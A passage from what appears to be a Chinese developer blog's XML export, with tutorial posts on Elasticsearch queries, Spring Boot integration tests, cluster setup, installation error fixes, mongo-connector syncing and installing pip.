.setSearchType(SearchType.QUERY_THEN_FETCH) .setQuery(boolBuilder) .setFrom(0) .setSize(10); // 高亮 //HighlightBuilder hBuilder = new HighlightBuilder(); //hBuilder.preTags(&quot;&lt;h2&gt;&quot;); //hBuilder.postTags(&quot;&lt;/h2&gt;&quot;); //hBuilder.field(&quot;question&quot;); //高亮的字段 //builder.highlighter(hBuilder); log.info(String.valueOf(builder)); SearchResponse response = builder.get(); response.getHits().forEach((s)-&gt;result.add(s.getSource())); &#125; catch (Exception e) &#123; e.printStackTrace(); log.error(e.getMessage(), e); &#125; return result; &#125; &#125; 五测试类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package top.lrshuai.es;import java.util.Date;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.test.context.junit4.SpringRunner;import top.lrshuai.es.entity.Person;import top.lrshuai.es.service.PersonService;@RunWith(SpringRunner.class)@SpringBootTestpublic class ApplicationTests &#123; @Autowired private PersonService personService; @Test public void testSavePerson() &#123; String name = &quot;帅大叔&quot;; String introduce = &quot;宇宙超级无敌帅&quot;; Person person = new Person(name, 23, &quot;男&quot;, new Date(), introduce); System.out.println(personService.savePerson(person)); &#125; @Test public void testUpdatePerson() &#123; String name = &quot;靓女&quot;; int age = 24; String sex = &quot;女&quot;; String introduce = &quot;这是一个非常非常非常非常漂亮的女孩。&quot;; Date birthday = new Date(); Person person = new Person(name, age, sex, birthday, introduce); person.setId(&quot;mjupFmABhhkOZSWoch9i&quot;); personService.updatePerson(person); &#125; @Test public void testFindPerson() &#123; String id = &quot;mjupFmABhhkOZSWoch9i&quot;; System.out.println(personService.findPerson(id)); &#125; @Test public void testDelPerson() &#123; String id = &quot;mjupFmABhhkOZSWoch9i&quot;; System.out.println(personService.delPerson(id)); &#125; @Test public void testQueryPerson() &#123; Person person = new Person(); person.setName(&quot;帅&quot;); person.setIntroduce(&quot;人&quot;);// person.setAge(27); Object obj = personService.queryPerson(person); System.out.println(obj); &#125;&#125; 示例代码：Github]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ElasticSearch CURL]]></title>
    <url>%2Fblog%2F2017%2F12%2F01%2FElasticSearch%20CURL%2F</url>
    <content type="text"><![CDATA[Elasticsearch 的语法一、添加1、创建索引索引名称为：test1234567891011121314151617181920212223242526272829PUT http://192.168.12.137:9200/test/&#123; &quot;setting&quot;:&#123; &quot;number_of_shards&quot;:5, &quot;number_of_replicas&quot;:1 &#125;, &quot;mappings&quot;:&#123; &quot;person&quot;:&#123; &quot;properties&quot;:&#123; &quot;name&quot;:&#123; &quot;type&quot;:&quot;text&quot; &#125;, &quot;age&quot;:&#123; &quot;type&quot;:&quot;integer&quot; &#125;, &quot;sex&quot;:&#123; &quot;type&quot;:&quot;string&quot; &#125;, &quot;birthday&quot;:&#123; &quot;type&quot;:&quot;date&quot;, &quot;format&quot;:&quot;yyyy-MM-dd HH:mm:ss || yyyy-MM-dd || epoch_millis&quot; &#125;, &quot;introduce&quot;:&#123; &quot;type&quot;:&quot;text&quot; &#125; &#125; &#125; &#125;&#125; 2、创建文档(自动生成ID)给文档person 新增数据12345POST http://192.168.12.137:9200/test/person/&#123; &quot;name&quot;:&quot;jieke&quot;, &quot;age&quot;:20&#125; 3、创建文档 (设置id的)12345POST http://192.168.12.137:9200/test/person/1&#123; &quot;name&quot;:&quot;pede&quot;, &quot;age&quot;:20&#125; 二、查询a、查询索引（test）1GET http://192.168.12.137:9201/test/_settings b、同时获取两个索引（test 和robot）1GET http://192.168.12.137:9201/test,robot/_settings c、查询所有索引的信息1http://192.168.12.137:9201/_all/_settings 1、查询文档信息通过ID1GET http://192.168.12.137:9200/test/person/1 2、查询文档信息通过name属性1GET http://192.168.12.137:9200/test/person/_search?q=name:jieke 3、通过_source 获取指定的字段只查询 name 字段的数据1GET http://192.168.12.137:9200/test/person/1?_source=name 4、查询所有数据123456POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;match_all&quot;:&#123;&#125; &#125;&#125; 5、form size分页查询12345678POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;match_all&quot;:&#123;&#125; &#125; &quot;from&quot;:1, &quot;size&quot;:2&#125; 6、查询并排序123456789101112# 排序POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;match&quot;:&#123; &quot;name&quot;:&quot;lrshuai&quot; &#125; &#125; &quot;sort&quot;:[ &#123;&quot;age&quot;:&#123;&quot;order&quot;:&quot;desc&quot;&#125;&#125; ]&#125; 7、分组查询 group_by12345678910111213141516171819202122232425262728293031323334353637383940# 统计个数POST http://localhost:9200/test/_search&#123; &quot;aggs&quot;:&#123; &quot;group_by_age&quot;:&#123; &quot;terms&quot;:&#123; &quot;field&quot;:&quot;age&quot; &#125; &#125;, &quot;group_by_name&quot;:&#123; &quot;terms&quot;:&#123; &quot;field&quot;:&quot;name&quot; &#125; &#125; &#125;&#125;# stats POST http://localhost:9200/test/_search&#123; &quot;aggs&quot;:&#123; &quot;group_by_age&quot;:&#123; &quot;stats&quot;:&#123; &quot;field&quot;:&quot;age&quot; &#125; &#125;, &#125;&#125;# 最小值POST http://localhost:9200/test/_search&#123; &quot;aggs&quot;:&#123; &quot;group_by_age&quot;:&#123; &quot;min&quot;:&#123; &quot;field&quot;:&quot;age&quot; &#125; &#125;, &#125;&#125; 8、match 查询123456789101112131415161718192021222324252627282930313233343536373839404142434445# 匹配name POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;match&quot;:&#123; &quot;name&quot;:&quot;lrshuai&quot; &#125; &#125;&#125;# match_phrase 全部匹配，不进行分词http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;match_phrase&quot;:&#123; &quot;introduce&quot;:&quot;人见&quot; &#125; &#125; &#125;# slop 是quick dog 相隔的距离有多少。# 通过设置一个像 50 或者 100 这样的高 slop 值, 你能够排除单词距离太远的文档， 但是也给予了那些单词临近的的文档更高的分数http://localhost:9200/test/_search&#123; &quot;query&quot;: &#123; &quot;match_phrase&quot;: &#123; &quot;title&quot;: &#123; &quot;query&quot;: &quot;quick dog&quot;, &quot;slop&quot;: 50 &#125; &#125; &#125;&#125;# multi_match 多个字段匹配POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;multi_match&quot;:&#123; &quot;query&quot;:&quot;见&quot;, &quot;fields&quot;:[&quot;name&quot;,&quot;introduce&quot;] &#125; &#125; &#125; 9、语法查询123456789101112131415161718192021222324252627282930# 语法查询http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;query_string&quot;:&#123; &quot;query&quot;:&quot;见 or 我&quot; &#125; &#125; &#125;# 语法查询指定字段POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;query_string&quot;:&#123; &quot;query&quot;:&quot;见 or 我&quot;, &quot;fields&quot;:[&quot;name&quot;,&quot;introduce&quot;] &#125; &#125; &#125;# 字段完全相等的查询POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;term&quot;:&#123; &quot;name&quot;:&quot;lrshuai&quot; &#125; &#125; &#125; 10、rang 范围查询123456789101112131415161718192021222324252627282930313233343536&#123; &quot;query&quot;:&#123; &quot;range&quot;:&#123; &quot;age&quot;:&#123; &quot;gte&quot;:20, &quot;lte&quot;:25 &#125; &#125; &#125; &#125;POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;range&quot; : &#123; &quot;create_time&quot; : &#123; &quot;gt&quot; : &quot;2017-01-01 00:00:00&quot;, &quot;lt&quot; : &quot;2017-12-07 00:00:00&quot; &#125; &#125; &#125;&#125;# 多一个月POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;range&quot; : &#123; &quot;create_time&quot; : &#123; &quot;gt&quot; : &quot;2017-01-01 00:00:00&quot;, &quot;lt&quot; : &quot;2017-12-07 00:00:00||+1M&quot; &#125; &#125; &#125;&#125; 11、should 查询should 满足其中一个就可以123456789101112131415161718192021POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;bool&quot;:&#123; &quot;should&quot;:[ &#123; &quot;match&quot;:&#123; &quot;name&quot;:&quot;tyro&quot; &#125; &#125;,&#123; &quot;range&quot;:&#123; &quot;age&quot;:&#123; &quot;gt&quot;:20, &quot;lte&quot;:25 &#125; &#125; &#125; ] &#125; &#125; &#125; 12、filter查询123456789101112POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;bool&quot;:&#123; &quot;filter&quot;:&#123; &quot;term&quot;:&#123; &quot;name&quot;:&quot;rstyro&quot; &#125; &#125; &#125; &#125; &#125; 13、must 与must_not12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# must 必须满足所有条件POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;bool&quot;:&#123; &quot;must&quot;:[ &#123; &quot;match&quot;:&#123; &quot;sex&quot;:&quot;女&quot; &#125; &#125;, &#123; &quot;range&quot;:&#123; &quot;age&quot;:&#123; &quot;lte&quot;:30 &#125; &#125; &#125; ] &#125; &#125; &#125;# 加上filter 过滤POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;bool&quot;:&#123; &quot;must&quot;:[ &#123; &quot;match&quot;:&#123; &quot;sex&quot;:&quot;女&quot; &#125; &#125; ], &quot;filter&quot;:[ &#123; &quot;term&quot;:&#123; &quot;introduce&quot;:&quot;人&quot; &#125; &#125; ] &#125; &#125; &#125;# must_not 必须不满足所有条件POST http://localhost:9200/test/_search&#123; &quot;query&quot;:&#123; &quot;bool&quot;:&#123; &quot;must_not&quot;:[ &#123; &quot;match&quot;:&#123; &quot;sex&quot;:&quot;女&quot; &#125; &#125;, &#123; &quot;range&quot;:&#123; &quot;age&quot;:&#123; &quot;lte&quot;:20 &#125; &#125; &#125; ] &#125; &#125; &#125; 14、查询语句提高权重content 字段必须包含 full 、 text 和 search所有三个词。如果content 字段也包含Elasticsearch 或 Lucene，文档会获得更高的评分 _score 。123456789101112131415161718&#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;must&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &#123; &quot;query&quot;: &quot;full text search&quot;, &quot;operator&quot;: &quot;and&quot; &#125; &#125; &#125;, &quot;should&quot;: [ &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;Elasticsearch&quot; &#125;&#125;, &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;Lucene&quot; &#125;&#125; ] &#125; &#125;&#125; 再修改一下：1234567891011121314151617181920212223242526272829GET /_search&#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;must&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &#123; &quot;query&quot;: &quot;full text search&quot;, &quot;operator&quot;: &quot;and&quot; &#125; &#125; &#125;, &quot;should&quot;: [ &#123; &quot;match&quot;: &#123; &quot;content&quot;: &#123; &quot;query&quot;: &quot;Elasticsearch&quot;, &quot;boost&quot;: 3 &#125; &#125;&#125;, &#123; &quot;match&quot;: &#123; &quot;content&quot;: &#123; &quot;query&quot;: &quot;Lucene&quot;, &quot;boost&quot;: 2 &#125; &#125;&#125; ] &#125; &#125;&#125; 上面的语句使用默认的 boost 值 1 。而&quot;query&quot;: &quot;Elasticsearch&quot;, &quot;boost&quot;: 3 这条语句更为重要，因为它有最高的 boost 值。&quot;query&quot;: &quot;Lucene&quot;,&quot;boost&quot;: 2 这条语句比使用默认值的更重要，但它的重要性不及Elasticsearch 语句。还有一种方法：boosting 查询1234567891011121314151617&#123; &quot;query&quot;: &#123; &quot;boosting&quot;: &#123; &quot;positive&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;Elasticsearch&quot; &#125; &#125;, &quot;negative&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;Lucene&quot; &#125; &#125;, &quot;negative_boost&quot;: 0.5 &#125; &#125;&#125; 它接受 positive 和 negative 查询。只有那些匹配 positive 查询的文档罗列出来，对于那些同时还匹配 negative 查询的文档将通过文档的原始 _score 与 negative_boost 相乘的方式降级后的结果。为了达到效果， negative_boost 的值必须小于 1.0 。在这个示例中，所有包含负向词的文档评分 _score 都会减半。 15、dis_max 查询分离 最大化查询比如有如下两条数据：1234567891011PUT /my_index/my_type/1&#123; &quot;title&quot;: &quot;Quick brown rabbits&quot;, &quot;body&quot;: &quot;Brown rabbits are commonly seen.&quot;&#125;PUT /my_index/my_type/2&#123; &quot;title&quot;: &quot;Keeping pets healthy&quot;, &quot;body&quot;: &quot;My quick brown fox eats rabbits on a regular basis.&quot;&#125; 我们进行查询12345678910&#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;should&quot;: [ &#123; &quot;match&quot;: &#123; &quot;title&quot;: &quot;Brown fox&quot; &#125;&#125;, &#123; &quot;match&quot;: &#123; &quot;body&quot;: &quot;Brown fox&quot; &#125;&#125; ] &#125; &#125;&#125; 但返回的结果：发现查询的结果是文档 1 的评分更高：1234567891011121314151617181920&#123; &quot;hits&quot;: [ &#123; &quot;_id&quot;: &quot;1&quot;, &quot;_score&quot;: 0.14809652, &quot;_source&quot;: &#123; &quot;title&quot;: &quot;Quick brown rabbits&quot;, &quot;body&quot;: &quot;Brown rabbits are commonly seen.&quot; &#125; &#125;, &#123; &quot;_id&quot;: &quot;2&quot;, &quot;_score&quot;: 0.09256032, &quot;_source&quot;: &#123; &quot;title&quot;: &quot;Keeping pets healthy&quot;, &quot;body&quot;: &quot;My quick brown fox eats rabbits on a regular basis.&quot; &#125; &#125; ]&#125; 为了理解导致这样的原因， 需要回想一下 bool 是如何计算评分的：1、它会执行 should 语句中的两个查询。2、加和两个查询的评分。3、乘以匹配语句的总数。4、除以所有语句总数（这里为：2）。文档 1 的两个字段都包含 brown 这个词，所以两个 match 语句都能成功匹配并且有一个评分。文档 2 的 body 字段同时包含 brown 和 fox 这两个词，但 title 字段没有包含任何词。这样， body 查询结果中的高分，加上 title 查询中的 0 分，然后乘以二分之一，就得到比文档 1 更低的整体评分。在本例中， title 和 body 字段是相互竞争的关系，所以就需要找到单个 最佳匹配 的字段。如果不是简单将每个字段的评分结果加在一起，而是将 最佳匹配 字段的评分作为查询的整体评分，结果会怎样？这样返回的结果可能是： 同时 包含 brown 和 fox 的单个字段比反复出现相同词语的多个不同字段有更高的相关度12345678910&#123; &quot;query&quot;: &#123; &quot;dis_max&quot;: &#123; &quot;queries&quot;: [ &#123; &quot;match&quot;: &#123; &quot;title&quot;: &quot;Brown fox&quot; &#125;&#125;, &#123; &quot;match&quot;: &#123; &quot;body&quot;: &quot;Brown fox&quot; &#125;&#125; ] &#125; &#125;&#125; 分离最大化查询（Disjunction Max Query）指的是： 将任何与任一查询匹配的文档作为结果返回，但只将最佳匹配的评分作为查询的评分结果返回 ：1234567891011121314151617181920&#123; &quot;hits&quot;: [ &#123; &quot;_id&quot;: &quot;2&quot;, &quot;_score&quot;: 0.21509302, &quot;_source&quot;: &#123; &quot;title&quot;: &quot;Keeping pets healthy&quot;, &quot;body&quot;: &quot;My quick brown fox eats rabbits on a regular basis.&quot; &#125; &#125;, &#123; &quot;_id&quot;: &quot;1&quot;, &quot;_score&quot;: 0.12713557, &quot;_source&quot;: &#123; &quot;title&quot;: &quot;Quick brown rabbits&quot;, &quot;body&quot;: &quot;Brown rabbits are commonly seen.&quot; &#125; &#125; ]&#125; 16、multi_match 查询multi_match 查询为能在多个字段上反复执行相同查询提供了一种便捷方式 multi_match 多匹配查询的类型有多种，其中的三种恰巧与 了解我们的数据 中介绍的三个场景对应，即： best_fields 、 most_fields 和 cross_fields （最佳字段、多数字段、跨字段） 如下简单demo:bool查询123456789101112&#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;should&quot;: [ &#123; &quot;match&quot;: &#123; &quot;street&quot;: &quot;Poland Street W1V&quot; &#125;&#125;, &#123; &quot;match&quot;: &#123; &quot;city&quot;: &quot;Poland Street W1V&quot; &#125;&#125;, &#123; &quot;match&quot;: &#123; &quot;country&quot;: &quot;Poland Street W1V&quot; &#125;&#125;, &#123; &quot;match&quot;: &#123; &quot;postcode&quot;: &quot;Poland Street W1V&quot; &#125;&#125; ] &#125; &#125;&#125; 换成multi_match 查询123456789&#123; &quot;query&quot;: &#123; &quot;multi_match&quot;: &#123; &quot;query&quot;: &quot;Poland Street W1V&quot;, &quot;type&quot;: &quot;most_fields&quot;, &quot;fields&quot;: [ &quot;street&quot;, &quot;city&quot;, &quot;country&quot;, &quot;postcode&quot; ] &#125; &#125;&#125; 三、修改1、直接修改修改文档person id为1 的name属性为 ‘杰克’123456POST http://192.168.12.137:9201/test/person/1/_update&#123; &quot;doc&quot;:&#123; &quot;name&quot;:&quot;杰克&quot; &#125;&#125; 2、脚本修改12345678910111213141516171819POST http://192.168.12.137:9201/test/person/1/_update&#123; &quot;script&quot;:&#123; &quot;lang&quot;:&quot;painless&quot;, &quot;inline&quot;:&quot;ctx._source.age += 10&quot; &#125;&#125;//或者这样的POST http://192.168.12.137:9201/test/person/1/_update&#123; &quot;script&quot;:&#123; &quot;lang&quot;:&quot;painless&quot;, &quot;inline&quot;:&quot;ctx._source.age =params.age&quot; &quot;params&quot;:&#123; &quot;age&quot;:30 &#125; &#125;&#125; 四、删除1、删除索引删除test 索引1DELETE http://192.168.12.137:9201/test 2、删除文档id 为1 的数据1DELETE http://192.168.12.137:9201/test/person/1 3、通过条件删除数据12345678POST twitter/_delete_by_query&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;message&quot;: &quot;some message&quot; &#125; &#125;&#125; 我这个是5.6.4 版本的，具体的看文档：https://www.elastic.co/guide/en/elasticsearch/reference/5.6/docs-delete-by-query.html#docs-delete-by-query4、删除字段（field）删除 person 文档里的field 字段1234567POST http://192.168.12.137:9201/test/person/_update&#123; &quot;script&quot;:&#123; &quot;lang&quot;:&quot;painless&quot;, &quot;inline&quot;:&quot;ctx._source.remove(\&quot;field\&quot;)&quot; &#125;&#125; 五、mapping 映射在创建索引的时候，可以预先定义字段的类型与相关属性，分为静态映射和动态映射每个字段可添加的属性有： 属性 说明 适用类型 store 可选值有：yes、no ,设为yes就是存储，no 不存储 all index 可选值有：analyzed、not_analyzed、no ,analyzed— 索引并分析，not_analyzed – 索引但不分析，no —不索引这个字段，这样就搜不到了。默认值是：analyzed string ,其他类型只能设置 not_analyzed、no null_value 当字段为空时，可以为它设置一个默认值：比如 “null_value”:”NAN” all boost 字段的权重。默认值：1.0 all index_analyzer 设置一个索引时用的分析器 all search_analyzer 设置一个搜索时用的分析器 all analyzer 可以设置索引和搜索时用到的分析器，默认使用 standard 分析器，除外，你还可以使用 whitespace、simple、english 这3个内置的分析器 all include_in_all 它的作用是每个字段默认都搜索到，如果你不想让某个字段被搜索到，那么将这个字段设置为false 即可。默认值:true all index_name 定义字段的名称，默认值是字段本身的名字 all norms 作用是根据各种规范化因素去计算权值，这样方便查询，在analyzed 定义字段里，值为true、not-analyzed 是 false。 all 1、创建索引并配置映射1234567891011121314151617181920212223242526PUT http://192.168.12.137:9201/person&#123; &quot;setting&quot;:&#123; &quot;number_of_shards&quot;:5, &quot;number_of_replicas&quot;:1 &#125;, &quot;mappings&quot;:&#123; &quot;man&quot;:&#123; &quot;properties&quot;:&#123; &quot;name&quot;:&#123; &quot;type&quot;:&quot;string&quot;, &quot;index&quot;:&quot;not_analyzed&quot; &#125;, &quot;age&quot;:&#123; &quot;type&quot;:&quot;integer&quot; &#125;, &quot;sex&quot;:&#123; &quot;type&quot;:&quot;string&quot; &#125;, &quot;money&quot;:&#123; &quot;type&quot;:&quot;double&quot; &#125; &#125; &#125; &#125;&#125; 2、查看映射1GET http://192.168.12.137:9201/person/_mapping 3、删除映射1DELETE http://192.168.12.137:9201/person/man/_mapping 参考文献：https://www.elastic.co/guide/cn/elasticsearch/guide/current/index.html]]></content>
      <categories>
        <category>搜索引擎</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ElasticSearch 与 Mongodb 同步数据之mongo-connector]]></title>
    <url>%2Fblog%2F2017%2F12%2F01%2FElasticSearch%20%E4%B8%8E%20Mongodb%20%E5%90%8C%E6%AD%A5%E6%95%B0%E6%8D%AE%E4%B9%8Bmongo-connector%2F</url>
    <content type="text"><![CDATA[ElasticSearch 与 Mongodb 同步数据之mongo-connector一、安装ElasticSearch 并配置 集群可参看我之前的文章二、安装MongodbMongodb 安装并配置副本集可参看我的相关文章 ，我这里是只有一个mongo所以，栗子如下12345use admindb.runCommand(&#123;&quot;replSetInitiate&quot;:&#123;_id:&quot;robot&quot;,members:[&#123;_id:1,host:&quot;127.0.0.1:2222&quot;&#125;]&#125;&#125;)# 查看状态rs.status() 三、安装所需的工具1、pip2、mongo-connector (安装对应版本的：https://github.com/mongodb-labs/mongo-connector)3、elastic2-doc-manager(安装对应版本的：https://github.com/mongodb-labs/elastic2-doc-manager)123456# 安装pipyum -y install epel-release python-pip# 我这里是elaseic5 pip install 'mongo-connector[elastic5]pip install 'elastic2-doc-manager[elastic5]' 四、开启同步最好 elasticsearch 的启动用户和 mongo的启动用户一致下面是同步命令：1mongo-connector -m 127.0.0.1:2222 -t 127.0.0.1:9201 -d elastic2_doc_manager 参数: 说明 -m mongodb的地址与端口，端口默认为27017。 -t ES的地址与端口，端口默认为9200。 -d doc manager的名称，2.x版本为： elastic2-doc-manager。 五、在mongo 中插入数据验证]]></content>
      <categories>
        <category>搜索引擎</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ElasticSearch 分布式]]></title>
    <url>%2Fblog%2F2017%2F12%2F01%2FElasticSearch%20%E5%88%86%E5%B8%83%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[ElasticSearch 集群这个也是超级简单的配置一、Master 配置修改 /usr/local/elasticsearch/config/elasticsearch.yml 文件#123456789101112131415161718# 跨域问题http.cors.enabled: truehttp.cors.allow-origin: &quot;*&quot;# 集群名称cluster.name: lrshuai.topnode.name: masternode.master: true# 绑定ip ,0.0.0.0 默认network.host: 0.0.0.0# 绑定端口http.port: 9200# 设置节点间交互的tcp端口，默认是9300。transport.tcp.port: 9300# 设置是否压缩tcp传输时的数据，默认为false，不压缩。transport.tcp.compress: true 一、Slave 配置修改 /usr/local/elasticsearch/config/elasticsearch.yml 文件#1234567891011121314151617181920# 跨域问题http.cors.enabled: truehttp.cors.allow-origin: &quot;*&quot;# 集群名称,这个名称要一样cluster.name: lrshuai.topnode.name: slave1network.host: 127.0.0.1# 绑定端口http.port: 8200# 设置节点间交互的tcp端口，默认是9300。transport.tcp.port: 9301# 设置是否压缩tcp传输时的数据，默认为false，不压缩。transport.tcp.compress: true# 这个是集群中节点的自动发现和Master节点的选举。# 节点之间使用p2p的方式进行直接通信discovery.zen.ping.unicast.hosts:[&quot;127.0.0.1&quot;] 其他配置12345678910# 存放数据的地方，默认是安装目录path.data: /path/to/data1,/path/to/data2 # 存放log的地方，默认是安装目录# Path to log files:path.logs: /path/to/logs# 存放插件的地方，默认是安装目录# Path to where plugins are installed:path.plugins: /path/to/plugins 配置好直接正常启动即可，elasticsearch 会自动添加节点。]]></content>
      <categories>
        <category>搜索引擎</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch5.0+ 安装问题集锦]]></title>
    <url>%2Fblog%2F2017%2F11%2F30%2FElasticsearch5.0%2B%20%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98%E9%9B%86%E9%94%A6%2F</url>
    <content type="text"><![CDATA[Elasticsearch5.0+ 安装可能会出现的问题一、服务器内存不够 Java HotSpot(TM) 64-Bit Server VM warning: INFO: os::commit_memory(0x00000000c5330000, 986513408, 0) failed; error=’Cannot allocate memory’ (errno=12) 像我就是这种类型，穷人，服务器配置都是最低配的。装不了几个东西elasticsearch 的默认是2g内存，不够就改呗。 解决方法：修改 elasticsearch 下的config/jvm.options 文件1vim config/jvm.options 把12-Xms2g -Xmx2g 修改为12-Xms512m -Xmx512m 但是官方是不推荐更改JVM 的配置的，看如下图： 二、用root 用户启动报错 因为安全问题elasticsearch 不让用root用户直接运行，所以要创建新用户建议创建一个单独的用户用来运行ElasticSearch创建elsearch用户组 及elsearch用户 并为其设置密码 elasticsearch12groupadd elsearchuseradd elsearch -g elsearch -p elasticsearch 三、 权限不够 grep: /usr/local/elasticsearch/config/jvm.options: 权限不够Exception in thread “main” 2017-11-30 12:09:31,518 main ERROR No log4j2 configuration file found. Using default configuration: logging only errors to the console. Set system property ‘log4j2.debug’ to show Log4j2 internal initialization logging.2017-11-30 12:09:31,697 main ERROR Could not register mbeans java.security.AccessControlException: access denied (“javax.management.MBeanTrustPermission” “register”) 这个只需把elasticsearch 目录拥有者 修改为运行的用户即可。解决方案：切换到root用户 执行chown 命令1chown -R elsearch:elsearch /usr/local/elasticsearch 四、 ERROR: [2] bootstrap checks failed ERROR: [2] bootstrap checks failed[1]: max file descriptors [4096] for elasticsearch process is too low, increase to at least [65536][2]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144] 解决方案：1、切换到root用户，编辑limits.conf 添加类似如下内容1vi /etc/security/limits.conf 添加如下内容:1234* soft nofile 65536* hard nofile 65536* soft nproc 2048* hard nproc 4096 2、然后 ，修改配置sysctl.conf1vi /etc/sysctl.conf 添加下面配置：1vm.max_map_count=655360 保存退出后，在shell 下执行命令：1sysctl -p 五、浏览器访问不了虚拟机的elasticsearch如果在虚拟机中安装elasticSearch, 然后本地访问不了，可在elasticsearch 的配置文件（config/elasticsearch.yml）中加入123456# 这个是跨域的配置http.cors.enabled: truehttp.cors.allow-origin: &quot;*&quot;# 下面写上虚拟机的ipnetwork.host: 192.168.12.137 参考链接： http://www.cnblogs.com/sloveling/p/elasticsearch.html]]></content>
      <categories>
        <category>搜索引擎</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ElasticSearch 的安装]]></title>
    <url>%2Fblog%2F2017%2F11%2F30%2FElasticSearch%20%E7%9A%84%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[ElasticSearch 的安装这个安装超级简单，下载解压就可以了。前提是你已经安装了 JDK ,关于jdk的安装可参看我的文章：Linux 安装jdk一、下载安装包1、打开官网下载页:https://www.elastic.co/downloads/elasticsearch1wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.0.0.tar.gz 二、解压我解压到/usr/local 目录下1tar -zxvf elasticsearch-6.0.0.tar.gz -C /usr/local/ 三、启动1、进入elasticsearch 的目录，运行123cd /usr/local/elasticsearch-6.0.0# 启动bin/elasticsearch -d 如果报错的话，可以参看我的文章：Elasticsearch5.0+ 安装问题集锦2、在浏览器访问 http://localhost:9200 或者 用命令 curl http://localhost:9200一般返回类似如下信息：123456789101112131415&#123; &quot;name&quot; : &quot;O8y3xAV&quot;, &quot;cluster_name&quot; : &quot;elasticsearch&quot;, &quot;cluster_uuid&quot; : &quot;chl0ooDkTnuecJ3cQfWsJA&quot;, &quot;version&quot; : &#123; &quot;number&quot; : &quot;6.0.0&quot;, &quot;build_hash&quot; : &quot;8f0685b&quot;, &quot;build_date&quot; : &quot;2017-11-10T18:41:22.859Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;7.0.1&quot;, &quot;minimum_wire_compatibility_version&quot; : &quot;5.6.0&quot;, &quot;minimum_index_compatibility_version&quot; : &quot;5.0.0&quot; &#125;, &quot;tagline&quot; : &quot;You Know, for Search&quot;&#125; 如果浏览器访问不了的话，可以修改配置文件 添加12http.cors.enabled: truehttp.cors.allow-origin: &quot;*&quot;]]></content>
      <categories>
        <category>搜索引擎</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 安装pip]]></title>
    <url>%2Fblog%2F2017%2F11%2F30%2FLinux%20%E5%AE%89%E8%A3%85pip%2F</url>
    <content type="text"><![CDATA[1.YUM安装联网情况下，12yum -y install epel-releaseyum -y install python-pip 2、要安装或升级pip，需要下载 get-pip.py.地址：https://bootstrap.pypa.io/get-pip.py然后运行以下命令1python get-pip.py]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java jxl导入导出excel]]></title>
    <url>%2Fblog%2F2017%2F11%2F24%2Fjava%20jxl%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BAexcel%2F</url>
    <content type="text"><![CDATA[jxl导入导出excel一、导入依赖12345&lt;dependency&gt; &lt;groupId&gt;com.hynnet&lt;/groupId&gt; &lt;artifactId&gt;jxl&lt;/artifactId&gt; &lt;version&gt;2.6.12.1&lt;/version&gt;&lt;/dependency&gt; java 操作jxl 工具类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226import java.io.File;import java.io.IOException;import java.util.ArrayList;import java.util.HashMap;import java.util.Map;import 